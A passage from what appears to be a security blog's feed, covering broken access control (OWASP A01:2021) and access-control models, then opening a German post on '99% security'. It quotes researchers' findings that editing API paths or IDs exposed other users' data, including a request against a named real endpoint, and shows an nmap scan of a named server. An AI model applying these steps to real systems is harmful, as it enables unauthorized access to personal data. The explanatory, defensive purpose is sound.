Damit meine ich nicht nur die HTML Webseiten (von denen ja einige auch interaktiv sind und Parameter haben können), sondern auch die API, die den Server für eine App auf einem Telefon oder in einem Browser repräsentiert.
Die Liste aller dieser URLs ist wie eine Liste von Verben:
Tu-Worte, mit denen man der Anwendung Befehle erteilen kann - &amp;ldquo;zeige mir&amp;rdquo;, &amp;ldquo;finde mir&amp;rdquo;, &amp;ldquo;ändere mir&amp;rdquo;, &amp;ldquo;lösche mir&amp;rdquo;.
Wie in jedem Satz gibt es ein Subjekt - wer befiehlt? - und ein Objekt - was wird von dem Verb manipuliert?&lt;/p&gt;
&lt;p&gt;Wir können das in Deutsch aufschreiben:
&amp;ldquo;Kris will alle Schüler der Heinrich-Heine-Schule in Heikendorf finden.&amp;rdquo;&lt;/p&gt;
&lt;p&gt;Oder als Tripel:
(Kris, &amp;ldquo;finde alle&amp;rdquo;, &amp;ldquo;Heinrich-Heine-Schule (Heikendorf)&amp;rdquo;)&lt;/p&gt;
&lt;p&gt;Oder als Tabelle, mit den Subjekten als Zeilen, den Objekten als Spalten und den Verben da, wo die betreffende Aktion erlaubt ist.
Das ist dann eine Matrix von &amp;ldquo;Wer darf was tun?&amp;rdquo;.&lt;/p&gt;
&lt;h2 id=&#34;role-based-access-control&#34;&gt;
    &lt;a href=&#34;#role-based-access-control&#34;&gt;
	Role Based Access Control
    &lt;/a&gt;
&lt;/h2&gt;
&lt;p&gt;Wir sehen dann, daß die Tabelle schnell umfangreich wird, und werden anfangen, die Subjekte zu gruppieren.
Subjekte mit gleichen Rechten gruppieren wir zusammen, in einer &lt;em&gt;Role&lt;/em&gt;, und benennen diese (zum Beispiel &lt;em&gt;Schüler der HHS&lt;/em&gt;).
Objekte kann man ebenso gruppieren.
Wir bekommen &lt;em&gt;Role Based Access Control&lt;/em&gt;, &lt;em&gt;RBAC&lt;/em&gt;:&lt;/p&gt;
&lt;p&gt;Wir können so bestimmten Subjekten, oder Rollen, feste Rechte geben.
Wir müssen aber immer noch viele Relationen erlauben:
&amp;ldquo;Schüler der HHS können mit anderen Schülern der HHS Kontakte anbandeln.&amp;rdquo;
und extra, und verschieden davon
&amp;ldquo;Schüler der Max-Planck-Schule, Kiel können mit anderen Schülern der MPS Kontakte anbandeln.&amp;rdquo;&lt;/p&gt;
&lt;p&gt;Offenbar reicht das in diesem Kontext nicht - aber für viele Anwendungen ist das schon ausreichend.
Nämlich immer dann, wenn die interne Struktur innerhalb der Anwendung nicht weiter segmentiert werden muss.&lt;/p&gt;
&lt;h2 id=&#34;attribute-based-access-control&#34;&gt;
    &lt;a href=&#34;#attribute-based-access-control&#34;&gt;
	Attribute Based Access Control
    &lt;/a&gt;
&lt;/h2&gt;
&lt;p&gt;Oft will man Regeln formulieren, die Eigenschaften von Subjekten und Objekten abgleichen.
Ich kann die Zugangsregeln für Schülerkontakte zum Beispiel so vereinfachen, daß ich die Kontakte zulasse, wenn der aufrufende Schüler und der aufgerufenen Schüler dieselbe Schule besuchen.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&amp;ldquo;Schüler der HHS können mit anderen Schülern der HHS Kontakte anbandeln.&amp;rdquo;&lt;/li&gt;
&lt;li&gt;&amp;ldquo;Schüler der MPS können mit anderen Schülern der MPS Kontakte anbandeln.&amp;rdquo;&lt;/li&gt;
&lt;li&gt;…&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;alle diese RBAC-Regeln werden zu&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&amp;ldquo;Schüler A kann mit Schüler B Kontakt aufnehmen, wenn &lt;code&gt;A.schule_id == B.schule_id&lt;/code&gt;&amp;rdquo;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;also wenn Schüler A und B denselben Wert im Attribut &lt;code&gt;schule_id&lt;/code&gt; stehen haben.&lt;/p&gt;
&lt;p&gt;Die Zugriffsrechte werden nun also durch Attribute von Subjekten definiert und können so stark vereinfacht werden.
Das setzt natürlich voraus, daß ich die sicherheitsrelevanten Attribute identifiziere und Änderungen an denen kontrolliere, denn sonst ist der Schutz wirkungslos.&lt;/p&gt;
&lt;p&gt;Beispiel: Wenn ein Schüler seine &lt;code&gt;schule_id&lt;/code&gt; nach Belieben unkontrolliert ändern kann, dann ist ein Vergleich &lt;code&gt;A.schule_id == B.schule_id&lt;/code&gt; wirkungslos.&lt;/p&gt;
&lt;h1 id=&#34;was-heißt-das-für-anwendungsentwickler&#34;&gt;
    &lt;a href=&#34;#was-hei%c3%9ft-das-f%c3%bcr-anwendungsentwickler&#34;&gt;
	Was heißt das für Anwendungsentwickler?
    &lt;/a&gt;
&lt;/h1&gt;
&lt;p&gt;Als Anwendungsentwickler verwende ich ein Toolkit, um Webanwendungen und APIs zu schreiben.&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Ich muss wissen, welche Außenfläche meine Anwendung hat, also welche URLs mit welchen Parametern zugelassen werden.
Das ist nicht schwer.
Mein Toolkit hat fast sicher eine Funktion, die mir das sagt (&lt;code&gt;flask routes&lt;/code&gt; oder ähnliche Funktionen sind überall vorhanden).
Dies ist die Liste meiner Verben.&lt;/li&gt;
&lt;li&gt;Die Liste der Parameter jeder dieser aufrufbaren Seiten sind die Objekte in meinem Security-Modell.&lt;/li&gt;
&lt;li&gt;Ich muss meine Anwender identifizieren (ihnen also eindeutige Identifier zuweisen) und authentisieren (sie müssen die behauptete Identität also beweisen).&lt;/li&gt;
&lt;li&gt;Die Liste dieser Anwender ist dann die Liste meiner Subjekte.&lt;/li&gt;
&lt;li&gt;Ich muss nun ACL, RBAC oder ABAC Regeln die definieren, &amp;ldquo;Wer was mit wem&amp;rdquo; machen kann und dies im Access Control Framework meiner Anwendung ausdrücken.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Das ist nicht schwer, und es ist vor allen Dingen eine notwendige Arbeit.
Nicht nur aus rechtlichen und compliance Gründen, sondern auch, weil dies zu einem Datenmodell einer Anwendung gehört:
Als Nebenergebnis fällt dabei nämlich ein Transaktionsmodell heraus, also ein Diagramm, wie sich die Datensätze meiner Anwendung durch die Aufrufe von Methoden ändern lassen.
Ich erschlage also nicht nur alle Compliance-, viele Datenschutz und alle Security-Pflichten, sondern ich habe den kompletten Data Lifecycle meiner Anwendung mit einem Zustandsübergangsdiagramm dokumentiert,
das sowohl Entwicklern als auch Business Analysts allgemeinverständlich zeigt, was zum Teufel wir hier eigentlich tun und wie wir das modellieren.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>A01:2021 - Broken Access Control (en)</title>
      <link>https://blog.koehntopp.info/2021/11/16/a01-2021-broken-access-control-en.html</link>
      <pubDate>Tue, 23 Nov 2021 23:34:33 +0100</pubDate>
      
      <guid>https://blog.koehntopp.info/2021/11/16/a01-2021-broken-access-control-en.html</guid>
      <description>&lt;p&gt;Translation by Lenz Grimmer, German version &lt;a href=&#34;https://blog.koehntopp.info/2021/11/16/a01-2021-broken-access-control.html&#34;&gt;here&lt;/a&gt;

.&lt;/p&gt;
&lt;p&gt;A
&lt;a href=&#34;https://twitter.com/ChristianBasl/status/1459851276817158151&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;twitter thread by Christian Basl&lt;/a&gt;


discussed the
&lt;a href=&#34;https://zerforschung.org/posts/learnu/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;dissection of the &amp;ldquo;Learnu&amp;rdquo; app&lt;/a&gt;

.
Basl wrote:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Learnu operators say they have no expertise in IT security and have relied on outside consultants.
As a result, Learnu came to market insecurely, unbeknownst to them.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;In the discussion that developed, &lt;a href=&#34;https://twitter.com/ardewes/status/1460240730698493957&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Andreas Dewes&lt;/a&gt;

 took the view that&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Most startups I know go through a phase where IT security and compliance tend to take a back seat.
As they get bigger, they start to think about it, partly because customers or partners demand certifications, e.g. SOC 2 or ISO-27001.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;That&amp;rsquo;s a funny statement in light of &lt;a href=&#34;https://owasp.org/Top10/A01_2021-Broken_Access_Control/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;OWASP A01:2021 - Broken Access Control&lt;/a&gt;

.
&lt;a href=&#34;https://en.wikipedia.org/wiki/Open_Web_Application_Security_Project&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;OWASP&lt;/a&gt;

 is an NGO that aims to improve the security of applications and services on the Internet.
To this end, OWASP publishes a top 10 list of application security problems that is updated every year.&lt;/p&gt;
&lt;p&gt;For 2021, compared to 2017, there have been the following changes:&lt;/p&gt;
&lt;p&gt;&lt;p class=&#34;md__image&#34;&gt;
  &lt;img src=&#34;https://blog.koehntopp.info/uploads/2021/11/owasp-mapping.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;

&lt;/p&gt;
&lt;p&gt;&lt;em&gt;Broken Access Control was #5 in 2017 and is now problem #1. 94% of the applications tested had some form of broken access control. The former #1 perennial problem Injection is now only #3.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;We see a classic example of this in another school application tested by the Zerforschung team:
&lt;a href=&#34;https://zerforschung.org/posts/scoolio/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Scoolio&lt;/a&gt;

 was opened up by the researchers as follows:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;One endpoint of the application programming interface (API) immediately caught our attention: &lt;code&gt;/api/v3/Profile/{ProfileID}&lt;/code&gt;.
…
When we find exciting API endpoints that have a version component (here &lt;code&gt;/v3/&lt;/code&gt;), we like to try to change it sometimes.
So in our case &lt;code&gt;/api/v3/Profile/{ProfileID}&lt;/code&gt; became &lt;code&gt;/api/v2/Profile/{ProfileID}&lt;/code&gt;.
And tada: much more data!
But our own data is boring - we already know it.
So we also tried to enter a foreign ProfileID.
And to our little amazement, but great annoyance, we were of course able to access the detailed data of that foreign ID.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;This is a classic &amp;ldquo;A01:2021 - Broken Access Control&amp;rdquo; example.
The application knows the identity of the user because it is registered in the app.
It does not use this information to authenticate and authorize the connection to the server.
And accordingly, the API can be used to access arbitrary user records instead of just its own.&lt;/p&gt;
&lt;h1 id=&#34;identity-authentication-authorization-auditing-and-accounting&#34;&gt;
    &lt;a href=&#34;#identity-authentication-authorization-auditing-and-accounting&#34;&gt;
	Identity, authentication, authorization, auditing and accounting
    &lt;/a&gt;
&lt;/h1&gt;
&lt;p&gt;A few terms:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Identity:&lt;/strong&gt; I am me.
But I can&amp;rsquo;t access the web or an API.
An application has to do that on my behalf.
To do this, that application uses a unique user identifier that represents &amp;ldquo;me&amp;rdquo; in the context of the application.
But an identity with a unique identifier (a &amp;ldquo;principal&amp;rdquo;) that represents me is first of all an assertion.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Authentication:&lt;/strong&gt; I can also prove this.
If I can prove the claimed identity, then I am authentically me.
I usually confirm my identity with a password and often with a 2nd factor (such as a changing secret number typed from a Google Authenticator).&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;The asserted and confirmed identity must also be &lt;strong&gt;anchored&lt;/strong&gt; for some purposes, such as when that identity is to be tied to other rights or relationships in the real world.
For example, if I&amp;rsquo;m supposed to have a school affiliation and class affiliation in a school app, then it may be good if I can&amp;rsquo;t just make an account for myself.
Instead, a teacher should look at it, ask me if I did it, and then assign me to the school and class.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;An asserted, confirmed identity anchored in the real world is then granted access rights.
This is an &lt;strong&gt;authorization&lt;/strong&gt;, it determines what this identity is allowed to see, write, modify and delete in the context of the application.
We&amp;rsquo;ll talk a little more about that below.&lt;/li&gt;
&lt;li&gt;What I then do in the application may have to be recorded for evidentiary purposes.
For example, if the data I am accessing requires special protection, or if its change history needs to be documented.
In a school context, for example, this could be my collection of performance records.
A logbook in which accesses are linked to personal identities in a mandatory way that cannot be switched off is called an &lt;strong&gt;audit log&lt;/strong&gt;.&lt;/li&gt;
&lt;li&gt;If I use services that cost money, then a special form of audit log must be kept.
This audit log is the basis of accounting and shows which person has used which chargeable service and when.
This log is part of &lt;strong&gt;accounting&lt;/strong&gt;.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Much can be written on each of these topics, but we are to be primarily concerned here with &lt;em&gt;authorization&lt;/em&gt; precisely because it is Topic #1 on the current OWASP list.
And because it does not only appear in the Zerforschis&amp;rsquo;
&lt;a href=&#34;https://zerforschung.org/posts/scoolio/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Scoolio&lt;/a&gt;


article, but once again in the
&lt;a href=&#34;https://zerforschung.org/posts/meinschnelltest/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;My Quick Test&lt;/a&gt;


article:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;One of the first requests we notice is to &lt;code&gt;https://corona-api.de/persons/owner/{USER_ID}&lt;/code&gt;, where &lt;code&gt;USER_ID&lt;/code&gt; is of course the number of our account - e.g. &lt;code&gt;612341213acab23425251e21&lt;/code&gt;.
… [We shorten the URL]…
We dare to try one more time and remove the / at the end of the URL. And tada:&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;GET https://corona-api.de/persons
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;A list of people registered on the platform drops down to us.
A total of almost 400,000 with all the data that is collected during a Corona test.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Zerforschung then goes on to demonstrate that they can merrily change their identity or anchoring (the school affiliation) in either case (and presumably without it ending up in an audit log), and that they can write data at will by issuing a Corona test result to 177-year-old Robert Koch.&lt;/p&gt;
&lt;h1 id=&#34;authorization&#34;&gt;
    &lt;a href=&#34;#authorization&#34;&gt;
	Authorization
    &lt;/a&gt;
&lt;/h1&gt;
&lt;h2 id=&#34;verbs-and-subject-predicate-object-who-does-what-to-whom&#34;&gt;
    &lt;a href=&#34;#verbs-and-subject-predicate-object-who-does-what-to-whom&#34;&gt;
	Verbs and subject-predicate-object (Who does what to whom?)
    &lt;/a&gt;
&lt;/h2&gt;
&lt;p&gt;An application has an outside page.
This is a list of all URLs that are callable.
By this I mean not only the HTML web pages (some of which are interactive and can have parameters), but also the API that represents the server for an app on a phone or in a browser.
The list of all these URLs is like a list of verbs:
Do words that can be used to give commands to the application - &amp;ldquo;show me&amp;rdquo;, &amp;ldquo;find me&amp;rdquo;, &amp;ldquo;change me&amp;rdquo;, &amp;ldquo;delete me&amp;rdquo;.
As in any sentence, there is a subject - who commands? - and an object - what is being manipulated by the verb?&lt;/p&gt;
&lt;p&gt;We can write this down in German:
&amp;ldquo;Kris wants to find all the students at the Heinrich Heine School in Heikendorf.&amp;rdquo;&lt;/p&gt;
&lt;p&gt;Or as a triplet:
(Kris, &amp;ldquo;find all&amp;rdquo;, &amp;ldquo;Heinrich-Heine-Schule (Heikendorf)&amp;rdquo;)&lt;/p&gt;
&lt;p&gt;Or as a table, with the subjects as rows, the objects as columns, and the verbs where the action in question is allowed.
This is then a matrix of &amp;ldquo;Who may do what?&amp;rdquo;.&lt;/p&gt;
&lt;h2 id=&#34;role-based-access-control&#34;&gt;
    &lt;a href=&#34;#role-based-access-control&#34;&gt;
	Role Based Access Control
    &lt;/a&gt;
&lt;/h2&gt;
&lt;p&gt;We then see that the table quickly becomes large, and will start grouping the subjects.
Subjects with the same rights we group together, in a &lt;em&gt;role&lt;/em&gt;, and name them (for example &lt;em&gt;students of HHS&lt;/em&gt;).
Objects can be grouped in the same way.
We get &lt;em&gt;Role Based Access Control&lt;/em&gt;, &lt;em&gt;RBAC&lt;/em&gt;:&lt;/p&gt;
&lt;p&gt;We can thus give fixed rights to certain subjects, or roles.
However, we still need to allow many relations:
&amp;ldquo;Students of HHS can make contacts with other students of HHS.&amp;rdquo;
and extra, and different from it
&amp;ldquo;Students of the Max-Planck-Schule, Kiel can make contacts with other students of the MPS.&amp;rdquo;&lt;/p&gt;
&lt;p&gt;Obviously, this is not enough in this context - but for many applications it is already sufficient.
Namely, whenever the internal structure within the application does not need to be segmented further.&lt;/p&gt;
&lt;h2 id=&#34;attribute-based-access-control&#34;&gt;
    &lt;a href=&#34;#attribute-based-access-control&#34;&gt;
	Attribute Based Access Control
    &lt;/a&gt;
&lt;/h2&gt;
&lt;p&gt;Often one wants to formulate rules that match properties of subjects and objects.
For example, I can simplify the access rules for student contacts to allow contacts if the calling student and the called student attend the same school.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&amp;ldquo;HHS students can make contacts with other HHS students.&amp;rdquo;&lt;/li&gt;
&lt;li&gt;&amp;ldquo;MPS students can make contacts with other MPS students.&amp;rdquo;&lt;/li&gt;
&lt;li&gt;…&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;all these RBAC-Rules become&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&amp;ldquo;Student A can make contact with Student B, if &lt;code&gt;A.school_id == B.school_id&lt;/code&gt;&amp;rdquo;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;so if student A and B have the same value in the attribute &lt;code&gt;school_id&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;So, access rights are now defined by attributes of subjects and can thus be greatly simplified.
Of course, this requires that I identify the security-relevant attributes and control changes to those, because otherwise the protection is ineffective.&lt;/p&gt;
&lt;p&gt;Example: If a student can change his &lt;code&gt;school_id&lt;/code&gt; at will without control, then a comparison &lt;code&gt;A.school_id == B.school_id&lt;/code&gt; is ineffective.&lt;/p&gt;
&lt;h1 id=&#34;what-does-this-mean-for-application-developers&#34;&gt;
    &lt;a href=&#34;#what-does-this-mean-for-application-developers&#34;&gt;
	What does this mean for application developers?
    &lt;/a&gt;
&lt;/h1&gt;
&lt;p&gt;As an application developer, I use a toolkit to write web applications and APIs.&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;I need to know what my application&amp;rsquo;s outer surface is, i.e. which URLs are allowed with which parameters.
This is not difficult.
My toolkit almost certainly has a function that tells me this (&lt;code&gt;flask routes&lt;/code&gt; or similar functions are present everywhere).
This is my list of verbs.&lt;/li&gt;
&lt;li&gt;The list of parameters of each of these callable pages are the objects in my security model.&lt;/li&gt;
&lt;li&gt;I need to identify my users (i.e., assign them unique identifiers) and authenticate them (i.e., they need to prove the claimed identity).&lt;/li&gt;
&lt;li&gt;The list of these users is then the list of my subjects.&lt;/li&gt;
&lt;li&gt;I now need ACL, RBAC or ABAC rules that define &amp;ldquo;who can do what to whom&amp;rdquo; and express this in my application&amp;rsquo;s access control framework.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;This is not hard, and it is, above all, necessary work.
Not only for legal and compliance reasons, but also because this is part of an application&amp;rsquo;s data model:
As a side result, this produces a transaction model, i.e. a diagram of how the records of my application can be changed by calling methods.
So not only am I slaying all compliance, many data protection, and all security obligations, but I&amp;rsquo;ve documented the entire data lifecycle of my application with a state transition diagram,
that shows both developers and business analysts in a generally understandable way what the heck we&amp;rsquo;re actually doing here and how we&amp;rsquo;re modeling it.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>99% secure</title>
      <link>https://blog.koehntopp.info/2021/10/02/99-secure.html</link>
      <pubDate>Sat, 02 Oct 2021 19:17:00 +0000</pubDate>
      
      <guid>https://blog.koehntopp.info/2021/10/02/99-secure.html</guid>
      <description>&lt;p&gt;&lt;a href=&#34;https://twitter.com/Linuzifer/status/1443880403211857922&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Linus Neumann zitiert Prof. Norbert Pohlmann&lt;/a&gt;

:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Ich glaube, das ist so.
Diese 100%ige Sicherheit wird es nicht geben, und wenn der Chaos Computer Bild was findet, dann findet er das, und dann sagen wir, das ist gut.
Und dann überlegen wir uns, wie wir das wieder schließen können und dann ist es wieder besser.
Und dann können sie auch weiter suchen.&lt;/p&gt;
&lt;p&gt;Also, ich glaube, wir brauchen auch eine andere Grundhaltung und es geht nicht immer um 100 %, sondern die 99 %, die reichen und wir müssen mit den Restrisiken umgehen.
Neben ganz schnell reagieren auch natürlich auch Versicherungen oder wer übernimmt die Verantwortung, wenn was passiert.
Das kennen wir ja alles.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Das ist eine ganze Menge Stoff zum Entpacken und ich habe das &lt;a href=&#34;https://twitter.com/isotopp/status/1444182876677943299&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;auf Twitter&lt;/a&gt;

 mal getan. Dies ist die Volltextversion dieses Threads.&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;99 % Sicherheit, was soll das bedeuten?&lt;/li&gt;
&lt;li&gt;Der CCC ist mein Sicherheitscheck&lt;/li&gt;
&lt;li&gt;Hackerterrorcybercyberversicherungen und der Umgang mit Restrisiken&lt;/li&gt;
&lt;li&gt;Wir werden sowieso gehackt, Aufgeben ist eine Option.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Aber der Reihe nach:&lt;/p&gt;
&lt;h1 id=&#34;99-sicherheit-was-soll-das-bedeuten&#34;&gt;
    &lt;a href=&#34;#99-sicherheit-was-soll-das-bedeuten&#34;&gt;
	99 % Sicherheit, was soll das bedeuten?
    &lt;/a&gt;
&lt;/h1&gt;
&lt;p&gt;&lt;a href=&#34;https://pluspora.com/posts/6bd0e460002a013a97e8002590c0bfb8&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Auf Pluspora&lt;/a&gt;

 hat Rainer Sokoll einen Portscan von &lt;code&gt;www.digital-enabling.eu&lt;/code&gt; veröffentlicht, bevor der Server panisch vom Netz genommen worden ist:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;~$ nmap -sT www.digital-enabling.eu.
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;Starting Nmap 7.92 ( https://nmap.org ) at 2021-09-25 14:24 CEST
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;Nmap scan report for www.digital-enabling.eu. (213.133.104.155)
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;Host is up (0.037s latency).
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;rDNS record for 213.133.104.155: www155.your-server.de
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;Not shown: 935 filtered tcp ports (no-response), 51 closed tcp ports (conn-refused)
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;PORT     STATE SERVICE
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;21/tcp   open  ftp
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;22/tcp   open  ssh
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;25/tcp   open  smtp
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;80/tcp   open  http
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;110/tcp  open  pop3
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;143/tcp  open  imap
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;222/tcp  open  rsh-spx
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;443/tcp  open  https
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;465/tcp  open  smtps
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;587/tcp  open  submission
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;993/tcp  open  imaps
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;995/tcp  open  pop3s
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;3306/tcp open  mysql
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;5432/tcp open  postgresql
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;&lt;span class=&#34;go&#34;&gt;Nmap done: 1 IP address (1 host up) scanned in 55.71 seconds
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Wir sehen einen Server, der mehr Dienste produktiv ins Internet raushängt als ein übertrieben konfigurierter Honeypot, darunter &lt;code&gt;ftp&lt;/code&gt;, &lt;code&gt;mysql&lt;/code&gt; und &lt;code&gt;postgresql&lt;/code&gt;.
Das ist, wie man mir in der Kundenkommunikationsschulung beigebracht hat zu sagen, &amp;ldquo;keine empfohlene oder unterstützte Konfiguration&amp;rdquo;.&lt;/p&gt;
&lt;p&gt;Wenn wir also sagen, &amp;ldquo;Sicherheit ist relativ&amp;rdquo; und &amp;ldquo;perfekte Sicherheit gibt es nicht&amp;rdquo;, dann ist es doch so, daß man da differenzieren kann.
Es gibt eben besser und schlechter konfigurierte Systeme.&lt;/p&gt;
&lt;p&gt;Und es gibt sogar dokumentierte und allgemein anerkannte Best Practices, in englischer und deutscher Sprache.
Von denen wird erwartet, daß man sie umsetzt.&lt;/p&gt;
&lt;p&gt;Das nennt die deutsche Rechtsprechung nicht ohne Grund &amp;ldquo;Grundschutz&amp;rdquo; und &amp;ldquo;Stand der Technik&amp;rdquo;.
Der Grundschutz, wie vom &amp;ldquo;Bundesamt für Sicherheit in der Informationstechnik&amp;rdquo; (BSI) veröffentlicht, hat viele Spezialhandbücher für besondere Anwendungszwecke.
Der Grund-Grundschutz ist definiert in &amp;ldquo;SYS.1.1: Allgemeiner Server&amp;rdquo;.&lt;/p&gt;
&lt;p&gt;Wie grundlegend ist der?&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Der Baustein &amp;ldquo;SYS.1.1 Allgemeiner Server&amp;rdquo; ist für alle Server-IT-Systeme mit beliebigem Betriebssystem anzuwenden.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Das ist Amtsdeutsch für &amp;ldquo;Wenn Du das nicht machst, dann brauchst Du gar nicht weiter zu spielen&amp;rdquo;.&lt;/p&gt;
&lt;p&gt;Im Grund-Grundschutz SYS.1.1 gibt es Grund-Grund-Grundschutzanforderungen, im Kapitel 3.1 &amp;ldquo;Basis-Anforderungen&amp;rdquo;.
Dort wird in SYS.1.1.A2 &amp;ldquo;Benutzerauthentisierung an Servern&amp;rdquo;, gleich nach der geeigneten Aufstellung des Gerätes, gefordert:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Für die Anmeldung von Benutzern und Diensten am Server MÜSSEN Authentisierungsverfahren
eingesetzt werden, die dem Schutzbedarf der Server angemessen sind.&lt;/p&gt;
